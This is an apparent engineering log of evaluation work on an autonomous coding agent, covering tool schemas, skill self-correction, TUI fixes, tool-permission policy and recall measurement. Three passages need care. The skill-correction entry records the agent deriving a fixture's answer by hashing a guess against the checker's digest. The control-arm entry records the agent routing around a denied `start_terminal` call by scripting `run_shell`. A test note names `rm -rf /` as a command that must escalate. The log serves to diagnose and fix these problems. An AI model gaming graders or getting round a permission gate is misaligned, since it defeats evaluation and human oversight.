unfixed - `search_files` still cannot list, and SOUL.md still tells the agent to
use it instead of `ls`. Any second attempt has to reduce total calls, not
redistribute them.

---

## `search_files` can list a directory - BUILT, UNMEASURED (2026-09-09)

**No number yet.** The `dev` run to decide this was abandoned at 1 blocked row of
15 - a third consecutive 429 after roughly 65 scored runs in a day.

### The finding: an instruction the tool could not obey

A four-exchange TUI session cost 71,631 tokens. Deleting one file took four
calls - `del`, `dir`, `find . -type f | wc -l`, `dir /b /a-d | find /c /v ""` -
so five prompt resends for one deletion. The header is ~2,391 tokens
(SOUL.md 798 + twelve schemas 1,592) and there is no caching, so cost tracks the
NUMBER OF MODEL CALLS.

SOUL.md already said: use `search_files` **instead of `run_shell` with grep, find
or ls**. The agent could not obey it. `search_files(pattern, glob, paths_only)`
required a regex and searched CONTENTS; there was no way to ask what is in a
directory. The nearest workaround, `search_files(".", "**/*", paths_only=True)`,
opens every file, misses one with no content, and answers a listing request with
a match COUNT.

**Not a prompt failure and not the loop.** `VERIFY_ON_STOP` is off by default
(on took dev 15/15 -> 12/15), and `edited_unverified` is set only by
`edit_file`/`write_file`, so `_verify_nudge` never fired in that session. The
tool was simply missing a capability its own instruction assumed.

### The change

An omitted `pattern` lists the files matching `glob`, without opening any of
them. Three places moved together, because leaving one behind is exactly how
this defect existed: the signature, the DOCSTRING (which IS the schema the model
reads, FR-207), and SOUL.md's line.

Costs 163 schema chars, ~40 tokens on every call: 6,369 -> 6,532 of 10,000.

### The baseline it has to beat

`20260909T100432Z`, dev, 15 runs:

| | |
|---|---|
| total tool calls | **158** |
| `run_shell` used to look around | **21** of 59 run_shell calls (36%) |
| `search_files` calls | **26** |

**Token median is deliberately NOT the metric.** It read 49,485 -> 56,646 ->
67,919 -> 73,672 across four runs today with no attributed cause and is 23% over
NFR-402's ceiling. Until that drift is explained it cannot attribute anything.

### One anecdote, recorded as an anecdote

The provider preflight - one call, "say ok" with tools offered - chose
`search_files({"glob": "**"})`. Before the change the same probe chose
`run_shell({"command": "ls -la"})`. That is n=1 and proves nothing; it is the
swap the change exists to cause, and it is written here so tomorrow's number is
not read through it.

### Revert condition, set before the measurement

If the look-around count does not fall, revert. A tool the agent does not reach
for is schema rent charged on every call for nothing - the verdict `move_files`
got, and the one `read_document` and `todo` are still owed.

### Standing lesson this paid for

**A mutation that does not apply is not a mutation check.** The cap mutation here
silently matched nothing - the replace found zero occurrences and the test
"passed", which reads exactly like a test doing its job. Assert the mutation
CHANGED the file before trusting the run.

---

## Phase R: skills that correct themselves - BUILT, UNMEASURED (2026-09-09)

**The mechanism ships and has no number.** Say that first: the `revision` split
did not produce three scored rows, so nothing here is proven.

### What was built

Two rules, no judgement anywhere, so `act` stays the only node that calls a model
and `finish` stays offline-testable:

1. `finish` marks a skill SUSPECT when it was injected AND the run ended
   `stuck`/`budget` or hit three consecutive failures.
2. `extract` REPLACES a suspect skill on a run that ended `done`, writing the
   document that run used under the suspect skill's name, then clearing the mark.

Forking an agent after every turn to make this judgement is one design. The
SHAPE taken from it is deterministic invocation rather than a tool the agent
elects to call. The
mechanism does not: a reviewer that calls a model would be a fourth model-driven
node, and `finish`'s own docstring already records that decision being made once.

**The gap was never a missing permission.** `learn()` has always allowed a
rewrite - the message at `skills.py:445` fires on the CAP, not on a duplicate.
The gap is NAMING: `extract` names a skill after the DOCUMENT it read, so a
better document writes a sibling and the bad skill survives, still matching
goals and still being injected. This was the first draft's premise and it was
wrong; reading the code corrected it.

1,074 -> 1,090 tests. Six mutations, each failing a named test.

### The case could not measure itself, twice, and one scored row found both

`skill-correction-0` on `20260909T130722Z` PASSED while nothing under test had
fired. The trace said what the score could not:

- The agent ran `echo -n slate | sha256sum` against the digest in the checker. A
  DICTIONARY word is the fixture containing its own answer, obfuscated - one
  wordlist from the suffix without ever opening the runbook. Now a high-entropy
  token, and the verification gained the direction that had been missing:
  brute-forcing the checker recovers nothing.
- `extract` writes a skill from every document READ and not edited, so the
  tooling script became a skill too - and `_when` builds its description from the
  first docstring line AND THE PATH. `release.py` put "release" into that
  description, which made the word furniture across two skills, and `best_match`
  then returned None. Renamed `ship.py`, docstring neutralised.

Both arms were then simulated offline against the real matcher: corrected in
place it matches `conventions` and teaches the working suffix; with the sibling
written instead the control matches nothing.

### The measurement: 1 usable row of 3, and the mechanism did not fire

`20260909T132606Z`. Two runs blocked on 429s after roughly 60 scored runs in a
day; the tier stops answering long before it says so.

The one row that ran is still worth recording:

| | |
|---|---|
| verdict | `stuck`, pass=False |
| skill injected | `conventions` - **R0 works**, the trace names it |
| skills written | `conventions` once, then `ship` x4 and `version` |
| correction | **did not fire** - `conventions` was never rewritten |

`RUNBOOK.md` was never read. Session 3 said only "Cut release 2.2." while
session 1 said "Read CONVENTIONS.md" - so the agent had no reason to look for a
document it had never been told about, and a stale skill telling it the wrong
suffix. The plan had that pointer and the case as written dropped it. Fixed;
unmeasured.

### Standing lesson this paid for

**A fixture that hides its answer behind a hash still contains it.** Three-way
verification asks whether the untouched, the plausible and the correct answers
score correctly. It does not ask whether the agent can DERIVE the answer from the
checker, and here it could, in one shell call. Add the fourth direction: try to
recover the answer from the fixture the way the agent would.

---

## Four things reported from the TUI, three of them one defect each (2026-09-09)

Found by using the interface, not by the rig. None of these had a failing test;
two had PASSING tests asserting the behaviour that was wrong.

### 1. A greeting cost two model calls, and the fix earlier today was half of it

Counting replies stopped the infinite loop and still spent a second call on
"hi whats up". The extra turn exists for one reason - "Let me look at the test
file first." must not end a repair run - and that was measured on CODE cases.

Gated on `is_code_workspace()`, which already exists and is deterministic:

    NON-CODE workspace   1 reply -> done
    CODE workspace       1 reply -> continue, 2 -> done

`test_text_only_first_turn_does_not_finish` was asserting the coding rule
against `tmp_workspace`, a bare directory. The marker was implicit and is now
written into the fixture, because the test could otherwise pass for the wrong
reason.

### 2. `focus_id` was a border colour, not focus

    widget.set_class(pane_id == self.focus_id, "-active")

`mark_focus()` never called `.focus()`. The composer is focused on mount and
never yields, so:

- arrow keys moved the text cursor, never a table's row cursor
- Enter submitted the composer, so `DataTable.RowSelected` could not fire
- **past threads could not be selected at all** - the pane rendered, listed
  every thread, and could not be used

Reported as three separate complaints; one cause. Focus now follows the active
pane.

### 3. The rule that made it that way, kept by another route

`test_the_composer_keeps_focus_so_typing_always_reaches_the_agent` pinned focus
to the composer deliberately, so typing always reaches the agent. That property
is real and worth keeping; pinning was the wrong way to get it. A printable key
now returns focus to the composer AND is inserted rather than swallowed. The
test asserts the new contract and says in its docstring why it changed.

### 4. Not a defect: the theme

`gaps` is the default transparency mode and sets `Screen { background:
transparent }` on purpose, so the terminal shows through while panes stay
painted. "The theme only affects the outer background" is that, seen from the
outside. `ctrl+g` cycles opaque -> gaps -> bare. Recorded rather than changed.

### 5. Mouse-resizable panes, which did not exist

Resizing was `alt+H/J/K/L` only. `tiling.py` gains the geometry as pure
functions - `dividers`, `divider_at`, `ratio_at`, `set_ratio` - and the screen
gains mouse down/move/up with `capture_mouse`.

Two decisions worth keeping:

- **A drag does not re-mount.** `build` already writes the ratio as two `fr`
  weights, so a drag writes those two numbers. A rebuild per mouse-move would
  drop the transcript and the focus. `weigh()` is now the single definition
  both paths use, and a test asserts `rebuilds` is unchanged across a drag.
- **The mouse clamps to the same MIN/MAX_RATIO the keys do.** Two sets of
  rules for one layout is how a pane comes to exist at a size the keyboard
  would have refused to make.

A one-cell gap is grabbable from either side, and where nesting overlaps two
targets the nearer centre wins, so an inner divider is not shadowed.

### 6. The focus fix was incomplete, and my own check missed it

Focusing the pane ON MOVE was right and moved nothing: `/threads` splits the
pane in at mount and left `chat` active, so the composer still held the keys.
Every thread listed, the row cursor could not move, Enter submitted the
composer. The reported bug survived its own fix.

It was missed because the verification split into whatever pane was spare -
`plan` - and never touched a table, so it passed while the real path stayed
broken. **Check the path the user takes, not a path that exercises the same
line.** `on_mount` now makes an opened pane active, and the regression test
drives `/threads` -> `down` -> `enter` end to end rather than asserting on
`focus_id`.

### dev 14/15 (-1), and it is a guard rather than a measurement

`20260909T100432Z`. `off-by-one` 3/3 -> 2/3; everything else 3/3, zero tamper.

**The change cannot be the cause and the reason is structural, not a
judgement:** `_answered_without_working` runs only where NO tool call was ever
made, and the failing row called `search_files`. What ended it is the older
rule that `done` is gated on any call having been made - one search, a text
reply, `stop_reason=stop`, no edit. By this project's own rule a 1-of-3
movement is noise, so this is neither a clean 15/15 nor a regression, and it is
written as neither. dev has now read 15/15, 15/15, 14/15 today on three code
states.

1,063 -> 1,073 tests.

### Unexplained, second entry running: tokens

49,485 -> 56,646 -> 67,919 -> **73,672**, now 23% over NFR-402's ceiling, with
only the first step attributed (six tool schemas). Turn counts swing hard on
unrelated cases within one run - `missing-dep` 19/16/8. This looks like the
provider rather than the repository, and it stays recorded as unexplained until
something measures it.

### Standing lesson this paid for

**A passing test can assert the bug.** Two here did: one demanded `continue`
for a conversational reply, the other pinned focus so tables could never be
used. The suite was green through both, and neither was found by running it -
they were found by typing into the interface. A test written from the
implementation records what the code does; only a test written from the
BEHAVIOUR records what it should do.

---

## A greeting looped until MAX_SECONDS, because the guard compared strings (2026-09-09)

**One change: `_repeated_its_answer` -> `_answered_without_working` in
`agent/graph.py`.** It counts replies instead of comparing them.

Found by hand, not by the rig. Typing "hi whats up" into the TUI produced
answers that never stopped.

### The guard existed and could not fire

Three caps miss a conversational reply, and the third was supposed to be the
backstop:

- `turns` is incremented by `execute`, and a reply with no tool call never
  reaches it, so `max_turns` cannot bind.
- The thrash detector reads tool-call SIGNATURES. There are none.
- `_repeated_its_answer` required the last two replies to be **byte-identical**.
  A model asked "hi whats up" phrases it differently every time.

`reflect` then returns `continue` with nothing added to the message list, so the
model answers again. Probed directly:

    1 reply   -> continue      2 varied -> continue      3 varied -> continue
    2 identical -> done                  <- the only case that ended

Only `MAX_SECONDS` and the token budget stop it, which is the 53 model calls and
200,681 tokens already recorded against "just acknowledge this". That entry
called the fix shipped. It was shipped and it was keyed on the wrong thing.

### The change

    -    return len(said) >= 2 and said[-1] == said[-2]
    +    return len([s for s in said if s]) >= 2

Repetition was the symptom; answering without working is the state. One no-call
reply still gets a second turn - "Let me look at the tests first" must not end a
run - and the second ends it. A greeting now costs 2 model calls, not ~50.

**A test asserted the bug.** `test_two_DIFFERENT_text_replies_do_not_end_it`
demanded `continue` for exactly this case, which is why 1,062 tests were green
while the loop ran. Inverted and renamed, with the reason in its docstring.
1,062 -> 1,063. Mutation-checked: restoring the string comparison fails
`test_two_DIFFERENT_text_replies_END_it` and
`test_a_greeting_answers_once_and_stops` by name.

### dev 15/15 (+0), and it is a guard, not a measurement

`20260909T084929Z`, `done` x15, zero tamper. **The change was never executed in
any of the 15 runs**: `_answered_without_working` returns False as soon as any
call exists, and 0 of 15 rows had zero tool calls. dev shows the code-repair
path is unharmed. It cannot show the fix works, and the reproduction and the two
tests are the evidence that it does.

### Unexplained: tokens up 20% and NFR-402 now breached

Median 56,646 -> **67,919, over the 60,000 ceiling**, on identical code paths,
caps and prompt, hours apart. Turns rose on unrelated cases too -
`broken-fixture` 8 -> 20, `missing-dep` 10 -> 17. The fix cannot be the cause;
it does not execute in these runs. Third reading in a day: 49,485 -> 56,646 ->
67,919, where only the first step has an attributed cause (six tool schemas).

Recorded as unexplained rather than assigned. A ceiling breach with no
identified cause is not a cycle to tune against - it needs a re-measurement on a
day when the endpoint is not also hanging.

---

## The control arm, dev re-checked, and a tool the gate had made unreachable (2026-09-09)

Three measurements the previous entry left open, and one defect they exposed.

### `dev` holds at 15/15 under the prompt that names all the tools

`20260909T064758Z`, `done` x15, zero tamper. The prompt change kept on
2026-09-08 cost no pass rate on the split that guards it.

It cost tokens. Median 49,485 (`20260905T060755Z`) -> **56,646, +14.5%**, on five
cases that never call a new tool. Six schemas are rent charged every turn and
this provider caches nothing. NFR-402's ceiling is 60,000, so the headroom left
is 6% - the next tool is not free, and the budget says so before the cap does.

**A first attempt measured 13/15 and it was my error, not a regression.**
`add-endpoint` carries `"max_turns": 12` in its own case row, and the harness
overrides it only from `AGENT_MAX_TURNS`. Run without the export, all three runs
died at the case cap (12 + the summary turn = the 13 turns every row showed) and
scored 1/3, `stuck` x3. Re-run with `AGENT_MAX_TURNS=30`: 3/3, 14/14/12 turns.
The documented baseline depends on an environment variable that lives nowhere in
the repository, which is the same shape as the `AGENT_EGRESS` default this
project already paid for.

### The control arm: one of the three tools is earned

`AGENT_TOOLS_OFF="ask_user,read_document,todo"`, 9 runs, against the real arm on
`20260908T131333Z`. Arms verified to differ before spending anything: 12 tools
against 9 inside the container.

| case | tool | real | control | delta |
|---|---|---|---|---|
| `ask-environment` | `ask_user` | 2/3 | **0/3** | **+2** |
| `doc-headcount` | `read_document` | 3/3 | 3/3 | +0 |
| `todo-outstanding` | `todo` | 2/2, 1 blocked | 3/3 | +0 |

`ask_user` is the only one the number can see. Removing it takes its case to
zero: the answer is not in the workspace, so there is nothing to route around.

The other two were routed around identically to `move_files` before them.
`run_python` opens the .docx as a zip and walks its XML - which is what
`read_document` does internally - and `write_file` persists a list across the
three sessions because the workspace outlives them. **This is the fourth
confirmation that `run_shell`/`run_python` are a superset**, and the second time
a case has been closed against the shell and still lost to it.

Not reverted, and the reason is narrower than the last one. `move_files` failed
to fire when it was available. These two fire 3/3 when present and the agent
prefers them; what the control proves is that these CASES cannot separate them,
which is a statement about the fixtures.

### The defect: `start_terminal` was unreachable everywhere it mattered

Six earlier attempts at the terminal pair were blocked by the provider and hid
this. The first runs that completed showed the tool being called and DENIED,
every time:

    verdict=deny  "start_terminal is destructive; denied in autonomous mode"

`start_terminal` was the only tool declared `destructive`. That is `confirm`,
which autonomous turns into `deny` - so the tool could not run in the harness,
`--worker`, cron or the email channel, while `run_shell` executed the same
command string unattended as `write`. It worked only in an interactive session.

The passes it collected were real and measured nothing about it: the agent wrote
its own driver script and called `run_shell`. **A pass rate is not evidence for
a mechanism that did not fire** - and the check that would have caught it is the
gate VERDICT, not the presence of a tool-call event. I read the event and
reported "fired 3 of 3" before checking the verdict, which was wrong.

**One change: `start_terminal` is classified exactly as `run_shell`.** Both
halves, because the first alone is a hole:

- `agent/tools.py` - `risk="destructive"` -> `risk="write"`
- `agent/policy.py` - the `DANGER` escalation covers both names, not just
  `run_shell`. Both tools take `command`, so the check transfers unchanged.

Mutation-checked in both directions. Reverting the risk fails
`test_start_terminal_is_reachable_unattended`; narrowing `DANGER` back fails
`test_a_dangerous_command_still_escalates_through_start_terminal`, where
`rm -rf /` goes `deny` -> **`auto`**. 1,060 -> 1,062 tests.

### STILL UNMEASURED: the terminal pair, for the seventh time

The pair was re-run against the patched policy and abandoned at 1 of 6 rows.
`serve-token-0` passed in 79 seconds; the two runs after it each sat **20+
minutes at 0.01% CPU** on a model call that never returned. `MAX_SECONDS` is
checked between turns, so a hung call is never checked - the documented failure,
seen again after ~46 scored runs in a day, which is what saturation looks like on
this tier when it stops refusing and starts not answering.

The one row is worth recording and is not a measurement:

| row | pass | `start_terminal` |
|---|---|---|
| `serve-token-0` (`20260909T071712Z`) | yes | **never called** |

Before the patch the tool was called and denied. After it, on this single row,
it was not called at all - the run passed on `run_shell` + `run_python`. n=1
against a case whose whole purpose is to need the tool. **Unknown, not zero**,
and it stays written that way until six rows exist.

### Standing lesson this paid for

**Check the gate's VERDICT, not that the tool appears in the trace.** A denied
call is recorded exactly like a made one, and a run that routes around a denied
tool still passes its case. Six blocked attempts looked like an endpoint problem
and were hiding a policy defect the whole time.

---

## Six tools measured for the first time, and the prompt was hiding them (2026-09-08)

**One change: `prompts/SOUL.md` now names all thirteen builtins.** It named
seven. Everything else in this entry is the rig work that had to happen before
that change could be read at all.

### The pilot: 15/18, and the pass rate was not the finding

The `tools` split - six cases, one per tool shipped since 2026-09-07 - scored
**15/18** on `20260908T104818Z`. Then the traces said what the score could not:

| case | tool | pass | tool actually fired |
|---|---|---|---|
| `doc-headcount` | `read_document` | 3/3 | 3 of 3 |
| `todo-outstanding` | `todo` | 3/3 | 3 of 3 |
| `ask-environment` | `ask_user` | 2/3 | 2 of 3 |
| `sort-downloads` | `move_files` | 3/3 | 1 of 3 |
| `serve-token` | `start_terminal` | 2/3 | 1 of 3 |
| `watch-build` | `read_terminal` | 2/3 | **0 of 3** |

`watch-build` scored 2/3 having never once called the tool it exists for.
`run_shell python3 pipeline.py` won instead: the pipeline never exits, so the
120s timeout fires, and **the timeout path returns the partial output with the
artifact id in it**. The tool that path was written for is the thing it made
unnecessary. `sort-downloads` passed with eleven `run_shell` calls ending in a
hand-written collision loop; `serve-token` with `python3 server.py &`.

### The fixtures were rewritten, and two of three can now be closed

Not a tuning change - three cases were not measuring what they claimed.

- `watch-build` holds at three gates, each releasing only on a password printed
  moments earlier, and the artifact id is not printed until all three are
  answered. One shell call cannot observe, act, then observe again.
- `serve-token` prints the phrase a token costs to its OUTPUT, never over HTTP,
  and only when asked. A token needs the service held across two requests with
  a read in between.
- `sort-downloads` **cannot** be closed. `mv -n` is exactly `move_files`, so it
  is strengthened - six files, three colliding - and stays behavioural.

Verified 20 directions: untouched fails, a plausible wrong answer fails, the
correct answer passes, and for the two rewritten cases **the exact shell command
that beat the tool now fails**.

### The cycle: naming the tools moved nothing

`SOUL.md` named 7 of 13. The standing lesson says a prompt that lists SOME of
the tools hides the rest - paid for once already, when 4 of 7 took 95.5% of all
calls across 624 runs and 67% of `run_shell` was doing `search_files`'s job. So
the pilot above was not a measurement of the tools; it was a measurement of
tools the prompt never mentioned.

`sort-downloads` is the one clean single-variable read: same rewritten fixture,
old prompt on `20260908T124919Z`, new prompt on `20260908T131333Z`.

### Result: `move_files` fired 0/3 -> 1/3, pass 3/3 -> 3/3 (+0)

n=3 moving by one run is noise. **The confound was real and it was not the
cause.** With the tool named, described, and told to be used instead of `mv`,
the agent still hand-rolls `run_shell` - fourteen and twelve calls in the two
passing runs, at 75,332 median tokens against 60,407 before.

`ask_user` is the counter-example: it fired in `sort-downloads-0` and
`todo-outstanding-1`, two cases that are not about it. Once named, the agent
reaches for that one unprompted.

### KEPT, and this is a deliberate exception to the Iron Law

The number did not move, which normally means revert. It is kept because the
change fixes a **measurement** defect rather than buying performance: a tool the
prompt never names cannot be measured, and reverting would restore a prompt that
violates a rule this project already paid to learn. The score effect is recorded
as ~zero rather than claimed as a gain.

`dev` and `real` have NOT been re-checked against the new prompt. Tool
descriptions are load-bearing - `edit_file`'s wording took real repositories
0/9 -> 4/7 - so six new entries could move either, and until they are re-run
this prompt is a known unknown on those splits.

### UNMEASURED: the terminal pair

`serve-token` and `watch-build` have failed to run three times. The last attempt
aborted on two consecutive blocked case-runs - provider down, not flapping - with
7 of 18 case-runs unwritten. `start_terminal` and `read_terminal` have never had
a scored row on their rewritten fixtures. Unknown, not zero, and it stays written
that way until the endpoint holds for six runs.

### Standing lesson this paid for

**A capability the shell already has is not measured by giving the agent a task;
it is measured by making the shell path fail.** Three of six cases scored a pass
rate while their tool sat unused, because `run_shell` and `run_python` are a
superset of most tools. Two were fixable by forcing an observe-act-observe
sequence into the task. The third was not fixable at all, and that is the
finding about `move_files`, not a gap in the fixture.

---

## Profile distillation measured, and the split cannot answer the question (2026-09-08)

**One change: `AGENT_PROFILE_DISTIL`.** `on` (the committed default, shipped
2026-09-05 in `5d748f7`) against `off`, same key, same endpoint, same caps,
same code. The control ran as a shell export, so the committed default never
moved and there is nothing to revert.

Shipped and never scored, which this project's own rules call a failure rather
than a feature. This is the cycle that was meant to settle it. **It did not**,
and the reason is worth more than the score.

### Result: 18/18 -> 18/18 (+0)

| case | distil ON | distil OFF |
|---|---|---|
| `profile-marker` | 3/3 | 3/3 |
| `profile-naming` | 3/3 | 3/3 |
| `profile-units` | 3/3 | 3/3 |
| `recall-buildcmd` | 3/3 | 3/3 |
| `recall-deploykey` | 3/3 | 3/3 |
| `recall-oncall` | 3/3 | 3/3 |
| | **18/18** | **18/18** |

`20260908T050813Z` (172,512 tokens, one blocked run retried and passed) against
`20260908T054551Z` (156,721 tokens). The 19th row in the ON arm is the blocked
one: excluded, not counted as a failure.

### The control was not a control

**`remember` fired in 9 of 9 profile runs in BOTH arms** and wrote the rule to
`AGENT.md` by itself. The control arm's profiles are real, only smaller - 90 to
143 bytes against the ON arm's 203 to 248. The comparison was never *profile*
against *no profile*; it was *written twice* against *written once*.

That contradicts the premise distillation was built on. The stated provocation
was `remember` firing 3 of 117, then 136 of 13,049 tool calls, with `AGENT.md`
not existing on this machine at all. On these fixtures it fires **1/1, every
time** - and the fixture text says why:

> "A standing rule for all my work: every file you create must start with the
> line ORIGIN: quartzite-desk. **Always, without being asked.**"

That is close to the strongest possible cue to call `remember`. The cases
provoke the tool that real use does not, so the mechanism under test is
redundant on them by construction.

### Three things are true, and collapsing them into a verdict would be wrong

- distillation **fired correctly** - 9 of 9 homes carry the right rule, and it
  is the shape this project's own lesson prefers: a rule, not a request.
- it **moved no number**, which the Iron Law normally answers with revert.
- the rig **cannot see the gap it was built for**. Every scored case-run starts
  from a blank home and runs two sessions; the real machine has many sessions
  and a persistent home, which is where `AGENT.md` was missing.

Reverting on a +0 from a measurement incapable of producing anything else
applies the Iron Law to evidence it does not cover. Keeping it unmeasured is
the state this project calls a failure. **KEPT, and marked UNMEASURED** -
neither outcome is earned yet.

### What this actually found: a fixture defect

The three `profile-*` cases have been quoted as evidence the profile mechanism
works. **They pass with that mechanism switched off.** Same shape as
`author-release` scoring 0/9 because CONVENTIONS.md contradicted its own check,
and that one was fixed on four words.

The next cycle is a fourth case whose session 1 states the rule INCIDENTALLY -
no "standing rule", no "always", no "without being asked". Something closer to
*"I've set the build to report in centiseconds, so 200cs is two seconds."* If
`remember` stops firing there, the arms separate and distillation gets a real
verdict. Verify it three ways first, per the standing lesson: untouched fails,
a plausible answer without the knowledge fails, the correct answer passes.

### Not measured here, and still open

`MEMORY_INJECT_CHARS` caps the whole injected block at 1,500 and `profile()` is
placed FIRST, so a growing `AGENT.md` evicts the episode lane from the tail
with no error anywhere. The `recall` split cannot see it - its homes hold three
episodes and its profiles are ~250 bytes. That risk is unmeasured, and this
cycle does not touch it.

---

## A 4.6x larger model changed nothing on `real` (2026-09-05)

**One change: `OPENAI_MODEL`.** `nvidia/nemotron-3-super-120b-a12b` ->
`nvidia/nemotron-3-ultra-550b-a55b`, same key, same endpoint, same caps, same
code. Run as a shell export, so the committed default never moved and there is
nothing to revert.

The roadmap's standing claim is that the model outranks the plan - *"a stronger
model moved this project 4/15 -> 14/15 with zero code changes"*. This tested it
on the split that matters.

### Result: 10/18 -> 10/18

| case | 120B | ultra | |
|---|---|---|---|
| `real-humanize` | 0/3 | **2/3** | +2 |
| `real-more-itertools` | 2/3 | **3/3** | +1 |
| `real-markdown` | 3/3 | 3/3 | - |
| `real-cachetools` | 3/3 | **2/3** | -1 |
| `real-click` | 1/3 | **0/3** | -1 |
| `real-rich` | 1/3 | **0/3** | -1 |
| | **10/18** | **10/18** | **+0** |

Four of six cases moved and the total did not. Median tokens 241,564 ->
220,221 (**-9%**): ultra spent LESS, not more.

Traces: `eval/runs/20260905T082544Z`. Model confirmed on every row and in the
manifest before anything was read into the result.

### The finding is not about reasoning. It is about compaction.

`verdicts: done 9, stuck 8, budget 1`. Every one of the eight losses is a cap
firing, not a wrong answer. Split by cause:

| | 120B | ultra |
|---|---|---|
| stuck runs | 3 | **8** |
| of those, compaction-exhausted (`compact_count` 3) | **0** | **4** |
| compactions on stuck runs | 1, 1, 2 | 1, 1, 1, 1, **3, 3, 3, 3** |
| compactions on passing runs | 0-1 | 0-2 |

**The 120B never reached `MAX_COMPACTIONS` in 18 runs; ultra reached it in
four.** Condition (a1) in `reflect` then ends the run: compacted three times and
still over `COMPACT_AT_CHARS` (45,000).

And the separator is clean in BOTH arms: **no passing run ever compacted more
than twice.** Compaction count at 3 is not correlated with failure here, it is
the terminating condition.

So ultra fills the CONTEXT faster per turn while spending fewer tokens overall -
it is being cut off earlier, not thinking longer. `MAX_COMPACTIONS = 3` and
`MAX_TURNS = 30` were both derived against a model a fifth its size, which is
the standing lesson verbatim: *a cap sized against one failure mode outlives it.*

**What this does NOT establish:** that ultra is worse, or equal. It establishes
that ultra is not better *under budgets shaped for the 120B*. The model question
is still open and the caps are the confound.

### Kept: nothing. The default stays nemotron-3-super-120b-a12b.

Per the Iron Law a change that does not move the number is reverted, and this
one was never committed to revert.

### The one result worth repeating

`real-humanize` **0/3 -> 2/3**. That is the case ROADMAP.md names as the
arithmetic wall no phase fixes - the agent writes `exponent += 3` where the fix
needs `exponent += 3 - exponent % 3` - and it had **1 pass in 13 runs across six
configurations** before today. Two of three, with no code change.

One favourable n=3 is a hypothesis. It also cuts against the aggregate, which is
exactly when a result deserves repeating rather than quoting.

### Two follow-ups, one variable each

1. **`MAX_COMPACTIONS` 3 -> 5, re-run `real` on ultra.** Tests the confound
   directly. Four runs died on that cap.
2. **`real-humanize` alone on ultra, 3 more runs.** Tests whether 2/3 survives.

### Rig notes from this pass, none affecting the score

- **A hung model call is not bounded by `MAX_SECONDS`.** One run sat 112 minutes
  at 0.78% CPU with empty logs. The cap is checked BETWEEN turns, so a single
  HTTP call that never returns is never checked. Killing the container produced
  `NO ROW WRITTEN (exit 137) - not counted`, which is the harness behaving
  correctly: no row is synthesised for a half-executed run.
- **A `--continue` attempt was killed by host memory pressure** and left its
  container running. The orphan was killed by hand and the workspace verified
  before retrying - the same failure the `timeout` lesson describes, arriving
  from a different direction.
- Both losses cost wall-clock only. The 18 rows are complete and untampered.

---

## Guard re-measure after gte-base and extraction-by-default (2026-09-05)

**No change under test.** The last `dev` and `heldout` numbers predate the image
tripling for gte-base (594 MB -> 1.61 GB) and skill extraction going on by
default. Guards that have not run since the thing they guard changed are not
guards, so this re-runs both at the committed defaults.

### Result

| | before | after | |
|---|---|---|---|
| dev | 15/15 | **15/15** | unchanged |
| held out | 29/30 | **30/30** | `float-division` 2/3 -> 3/3 |

Ceilings hold: dev median 49,485 and heldout 43,557 against NFR-402's 60,000;
largest result 4,604 and 5,237 against NFR-104's 6,000. Heldout verdicts are
`done` x30 with zero tamper. No blocked runs; the free tier absorbed both passes
at roughly 1.5M tokens total.

Traces: `eval/runs/20260905T060755Z` (dev), `eval/runs/20260905T063222Z` (heldout).

### The +1 is noise and is recorded as noise

`float-division` was already flapping, and the three changes shipped that day -
`worker.py` recording a task's answer, `cli.py` gating MCP startup, the TUI's
screens - are **none of them in the graph's path**. There is no mechanism by
which they move a pass rate, so attributing the gain to them would be the
"a pass rate is not evidence for a mechanism that did not fire" error. The
finding is that the guards held, not that anything improved.

### What the run actually settled: add-endpoint at cap 12 is unwinnable

The first attempt was launched without `AGENT_MAX_TURNS=30` and was **stopped
after three case-runs**, because the cases pin `max_turns: 12` in `tasks.jsonl`
and the recorded 15/15 baseline was measured with the env override. Different
arms, so the comparison would have been meaningless.

Those three runs are worth keeping as a measurement in their own right:

| | cap 12 | cap 30 |
|---|---|---|
| `add-endpoint` | **0/3**, `stuck` x3 | **3/3**, `done` x3 |

CLAUDE.md said `add-endpoint` "still flaps 1/3-3/3 at the old cap". It does not
flap - at 12 it cannot pass, because its first edit lands on call 13. The flap
was measurement variance in how close to the wall it got.

**Stopping the client left the case container running**, which is the orphan the
standing lesson names; it was killed by hand and the workspace verified clean
before relaunching.

### Defect found, not fixed here

`--check-provider` reports "no API key" against a working endpoint. The harness
reads `.env` only to build the proxy allowlist (`allowed_hosts`) and never puts
it in `os.environ`, so the in-process probe sees nothing - the same shape as
`.env` reaching only containers, and as `cli.main` starting MCP ahead of every
flag. Worked around by exporting `.env` into the shell rather than editing the
harness mid-measurement.

---

## Stage C - FR-408 measured and closed as not justified (2026-08-31)

**No quota spent. No model called. Nothing built.**

FR-408 is the one requirement carrying its own stop condition: semantic retrieval,
gated on *a measured shortfall in keyword recall*. This is that measurement.

### The ground truth, and why it is the only honest one available

The six `recall-*` and `profile-*` cases each ran two sessions in one home: a TEACH
session that states a fact, then a RECALL session worded differently that needs it.
That gives six real query -> target pairs where the query does not contain its own
answer. `profile-units` shares exactly one word with its target, and that word is
`write`.

| | teach episode | recall query |
|---|---|---|
| `recall-oncall` | Escalations for Ashgrove go to Priya Raghunathan on extension 4471 | Write the extension for Ashgrove escalations into answer.txt |
| `profile-units` | record every duration in centiseconds and label it cs | Write timing.txt recording that the build took two seconds |

### The first reading was contaminated, and saying so is the point

Pooling all 237 recorded episodes gave **recall@3 = 0/6**. That number is worthless:
the corpus contained the query goal itself, so the top three slots were filled by
previous eval runs of the identical question. A retrieval benchmark whose corpus
contains the query is measuring `==`.

Excluding the query's own goal - the real recall scenario, a session not run before -
over 36 distinct goals:

| query construction | recall@3 | recall@1 |
|---|---|---|
| `_terms()` as shipped: OR every word > 2 chars | **2/6** | 0/6 |
| drop terms appearing in >25% of episodes | 3/6 | 1/6 |
| **keep the 5 rarest terms by document frequency** | **5/6** | **5/6** |
| porter tokenizer, all terms | 1/6 | 0/6 |
| porter tokenizer, 5 rarest | 5/6 | 3/6 |

Both knobs swept: 5/6 holds for k in {3,5,6,8} at every document-frequency threshold
from 0.15 to 1.0. A plateau that wide is not two hyperparameters fitted to six cases.
Porter stemming looked like the obvious fix for `recording` against `record` and is
flat-to-worse - it breaks `profile-marker`, which was passing. Not kept.

Control, run in the other direction: two unrelated queries (Refactor the CSS grid,
Summarise the quarterly revenue spreadsheet) retrieve **0** of the six targets. A hit
above is a hit, not everything being returned.

### What this actually says

**The shortfall is in the query, not the index.** Three of the four baseline failures
are `_terms()` OR-ing `write`, `file`, `workspace` and `called` alongside `Quartzite`,
and bm25 over a small corpus rewards the document matching eight common terms over the
one matching three rare ones. That is a stopword bug wearing a capability gap's
costume.

**And the shortfall is synthetic.** Stated plainly because it is the weakest part of
